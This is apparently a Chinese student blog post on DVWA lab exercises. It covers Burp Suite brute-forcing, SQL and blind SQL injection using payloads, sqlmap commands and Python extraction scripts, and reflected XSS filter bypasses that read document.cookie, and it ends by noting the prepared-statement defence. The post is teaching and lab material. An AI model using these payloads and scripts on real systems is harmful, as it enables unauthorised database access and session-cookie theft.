//将查询到的变量绑定到三个自定义的变量中，输出时直接输出这三个变量即可。if($result-&gt;fetch())&#123; printf(&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$un,$pd);&#125;else&#123; echo &quot;username or password error.&quot;;&#125;// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)// &#123;// echo &quot;It is too long.&quot;;// &#125;echo &quot;&lt;/TABLE&gt;&quot;;echo &quot;&lt;/div&gt;&quot;;$result-&gt;close();$mysqli-&gt;close();?&gt; 应用预编译语句后，再次输入注入语句后就不再起到注入作用，只是将其当成正常的查询过程，返回相应的结果。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"}]},{"title":"网安作业2","date":"2020-11-12T11:09:43.000Z","path":"2020/11/12/网安作业2/","text":"DVWA实验一下都是基于low,mid,high级别的实验，为了方便叙述，提前在数据库中建了一个flag表 Brute Force使用工具 ：bp 使用材料：密码字典 bp的四种爆破攻击类型第一种：Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。 第二种：Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中 第三种：Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量 第四种：Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。 low1.抓包–&gt;ctrl+I –&gt;标记要爆破的参数，这里直接爆破password 2.选择要加载的密码字典，可以使用自己准备的密码字典，也可以使用bp自带的密码字典，但是最重要的是要包含正确达到密码 3.开始爆破 ，根据响应包的长度筛选出正确密码的响应包，这里只有当密码为password的时候响应包的长度为4743,所以password就是争取密码。 medium1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 与low级别相比较，只是增加了回显的时间，所以还是可以使用low级别的方法直接爆破，不过花费的时间相对会长一点。 1.火狐浏览器打开代理抓包后发到爆破模块，添加爆破的变量。 2.加载密码字典进行爆破。 3.根据响应包的长度确定正确密码。 high1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 审计代码后可以发现使用了随机token机制来防止CSRF，从而在一定程度上防止了重放攻击，增加了爆破难度，但是任然可以使用bp的爆破模块 1.抓包，发包到爆破模块并添加参数，这次需要添加两个参数，设置 password和user_token为变量 2.攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。 3.设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always 4.设置payload，第一个参数是密码与之前两次一样，加载密码字典即可，第二token参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。 5.start attack,还是根据响应包长度的不同找到包含真正密码的请求包，获取正确密码。 SQL Injectionlow12345678910111213141516171819202122&lt;?phpif( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125;?&gt; SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;注入点就在这句代码中 手工注入1.判断注入类型1231 or 1=1 #1&#x27; or 1=1 # 可知是字符型注入 2.判断多少字段数11&#x27; order by 1,2,3 # 报错 11&#x27; order by 1,2 # 显示正常，说明只有2个字段 3.确认显示顺序 两个位置都可以使用 4.union查询11&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 11&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; # 11&#x27; union select 1,group_concat(fl4g) from flag # sqlmap注入12345python2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch --dbspython2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch -D dvwa -T flag --columnspython2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch -D dvwa -T flag -C fl4g --dump medium与low级别相比较，这里的id值不需要用户输入，只需要选择，但是可以抓包修改id的内容 手工注入经过测试是数字型注入，很简单的判断就不截图了 1.判断列数1id=1 order by 1,2#&amp;Submit=Submit 此时页面正常 1id=1 order by 1,2,3#&amp;Submit=Submit 此时页面报错 Unknown column &#39;3&#39; in &#39;order clause&#39; 所以可知为两列，之后的操作与low级别的一样 2.union查询12345678爆数据库名id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;Submit=Submit爆列名id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 #&amp;Submit=Submit读取flagid=-1 union select 1,group_concat(fl4g) from flag #&amp;Submit=Submit 这里读取列名的时候需要注意使用列名的十六进制，不然就会报错，应该是 &#39;被 \\转义了，可以使用十六进制绕过 分析源码 12345678910111213141516171819202122232425262728293031&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = &quot;SELECT COUNT(*) FROM users;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);?&gt; mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。 所以导致了单引号被转义的结果 sqlmap注入因为是post注入，所以需要抓取数据包保存下来。 如图，可以将其保存在sqlmap.py的路径下 注入过程1234python2 .\\sqlmap.py -r .\\a.txt --batch --dbspython2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa --tablespython2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa -T flag --columnspython2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa -T flag -C fl4g --dump high这次用户输入与回显不在同一个页面，这只要是为了防止sqlmap这种自动化注入工具的攻击 注入直接使用low级别的payload： 1231&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; #1&#x27; union select 1,group_concat(fl4g) from flag # 源码分析 123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125;?&gt; 1$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; 存在注入的语句只是在low级别的基础上加上了Limit限制了回显的行数，但是使用low级别的注入语句时会直接把Limit 1注释掉，所以完全与low级别一样。 SQL Injection (Blind)盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。 low手工加脚本查询成功返回的语句：User ID exists in the database. 查询失败返回的语句：User ID is MISSING from the database. 这样就可以利用提示信息确定，我们所查询的语句是否正确 首先确定盲注的语句 通过下面的测试，说明ascii函数是可以使用的，写注入的脚本，二分法更快点。 12341&#x27; and ascii(substring(database(),1,1))&gt;50 #提示 ：User ID exists in the database.1&#x27; and ascii(substring(database(),1,1))&lt;50 #提示： User ID is MISSING from the database. 1234567891011121314151617181920212223242526272829303132# -*- coding = utf - 8 -*-#@Time : 2020/10/26 17:29#@Author : sunzy#@File : dvwa.py# 二分法盲注import requestsurl = &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=&quot;header = &#123;&quot;Cookie&quot;: &quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;&#125;flag = &quot;&quot;for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #获取数据库名 #payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) #获取表名 #payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #获取列名 #payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #获取flag payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) url1 =url+payload+&quot;&amp;Submit=Submit#&quot; response = requests.post(url1,headers= header) if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid)print(flag) 1.首先获取表名 使用payload: 1payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) 2.获取列名 使用payload 1payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) 3.获取flag 使用payload 1payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) sqlmap1234567python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --dbs --batchpython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa --tables --batchpython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag --columns --batchpython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag -C fl4g --dump --batch medium手工加脚本与low级别不同，中级别提交数据是post类型，所以需要抓包后再提交。 1234id=1 and length(database())=4 #&amp;Submit=Submit提示User ID exists in the database.id=1 and length(database())=5 #&amp;Submit=SubmitUser ID is MISSING from the database 所以思路还是与low级别一样，只不过脚本中提交数据的方式改为POST类型 直接上脚本 1234567891011121314151617181920212223242526272829import requestsurl = &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;header = &#123;&quot;Cookie&quot;: &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;&#125;flag = &quot;&quot;t = &quot;&quot;sum=0for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #payload = &quot;1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) #payload = &quot;1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) data = &#123;&#x27;id&#x27;: payload, &#x27;Submit&#x27;: &#x27;Submit&#x27;&#125; response = requests.post(url,headers = header,data=data) t = response.text if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(mid) flag = flag + chr(mid)print(flag) sqlmap123456789python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --dbspython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa --tablespython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag --columnspython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; -D dvwa -T flag -C fl4g --dump sqlmap中给了三种注入方式，并且给出了payload，可以基于给出的提示继续做下去 下面是sqlmap爆出的flag。 源码分析 1234567891011121314151617181920212223242526&lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysql_real_escape_string( $id ); // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; //mysql_close(); &#125; ?&gt; mysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \\x00, \\n, \\r, \\, &#39;, &quot; 和 \\x1a. 本质上跟low级别的没有太大的区别，只是将一些特殊字符转义，但是我们注入时没有用到这些字符，所以注入语句基本和low级别一样 high12345678910GET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1Host: 10.5.8.66User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://10.5.8.66/dvwa/vulnerabilities/sqli/Connection: closeCookie: id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1Upgrade-Insecure-Requests: 1Cache-Control: max-age=0 抓包后可以发现提交的参数id在cookie中，所以与中级别的方法不一样了，但是还是可以使用sqlmap注入。 手工加脚本通过手工测试发现是字符型注入，与low级别的脚本大同小异，只是将注入的位置改到了cookie的位置 123456789101112131415161718192021222324252627import requestsurl = &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;t=&quot;&quot;flag = &quot;&quot;for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) #payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) id = payload header = &#123;&quot;Cookie&quot;: &quot;id=&quot;+payload+&quot;;&quot;+&quot;security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;&#125; #print(header) response = requests.post(url,headers = header) t = response.text if &quot;exists&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(mid) #print(t) flag = flag + chr(mid)print(flag) sqlmap1234567python2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 --dbs --batchpython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa --tables --batchpython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa -T flag --columns --batchpython2 sqlmap.py -u &quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot; -p &quot;id&quot; --cookie &quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot; --level 2 -D dvwa -T flag -C fl4g --dump --batch sql注入防御通过查看impossible源码发现检测了id数据类型，使用了预编译绑定id变量，有效防止SQL注入，这些可以在以后编程中应用，以编写出更加安全的代码。 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $id = $_GET[ &#x27;id&#x27; ]; // Was a number entered? if(is_numeric( $id )) &#123; //检测提交的数据是否为数字类型 // Check the database $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );//预编译绑定了id变量 $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT ); $data-&gt;execute(); // Get results if( $data-&gt;rowCount() == 1 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; XSS (Reflected)low1234567891011&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。 先测试一下 1&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt; 获取cookie 1&lt;script&gt;alert(document.cookie);&lt;/script&gt; medium12345678910&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 代码审计后可以发现是对输入的内容进行了过滤，将&lt;script&gt;替换为空，可以双写绕过，也可以大小写绕过。 构造payload： 12345&lt;sCriPt&gt;alert(document.cookie)&lt;/script&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;//使用其他标签&lt;IMG src=1 onerror=alert(document.cookie)&gt; high12345678910&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 先代码审计，执行一个正则表达式的搜索和替换,其中 /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i 是正则表达式 (.*) 表示贪婪匹配，/i 表示不区分大小写所以在High级别的代码中，所有关于 &lt;script&gt; 标签均被过滤删除了 